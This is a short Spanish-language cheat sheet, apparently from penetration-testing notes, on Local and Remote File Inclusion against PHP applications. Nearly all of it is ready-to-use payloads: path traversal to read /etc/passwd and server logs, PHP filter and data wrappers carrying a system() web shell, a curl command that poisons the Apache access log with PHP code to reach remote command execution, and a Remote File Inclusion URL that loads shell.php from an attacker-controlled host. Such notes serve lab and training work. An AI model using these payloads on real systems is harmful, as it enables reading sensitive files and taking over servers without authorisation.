---
title: LFI / RFI
order: 2
description: Local y Remote File Inclusion — lectura de ficheros sensibles, wrappers PHP y escalada a RCE mediante log poisoning.
---

## Local File Inclusion (LFI)

Permite leer ficheros del servidor a través de un parámetro vulnerable:

```bash wrap=false
http://10.10.10.10/index.php?page=../../../../etc/passwd
```

Ficheros interesantes:

```txt
/etc/passwd
/etc/hosts
/var/log/apache2/access.log
C:\Windows\System32\drivers\etc\hosts
```

## Wrappers PHP

```bash wrap=false
php://filter/convert.base64-encode/resource=index.php
data://text/plain,<?php system($_GET['c']); ?>
```

## De LFI a RCE (Log Poisoning)

1. Inyecta PHP en un log accesible (p. ej. `User-Agent`):

```bash wrap=false
curl -A "<?php system(\$_GET['c']); ?>" http://10.10.10.10/
```

2. Incluye el log y ejecuta comandos:

```bash wrap=false
http://10.10.10.10/index.php?page=/var/log/apache2/access.log&c=id
```

## Remote File Inclusion (RFI)

Si `allow_url_include` está activo, se incluye un fichero remoto:

```bash wrap=false
http://10.10.10.10/index.php?page=http://10.10.14.5/shell.php
```
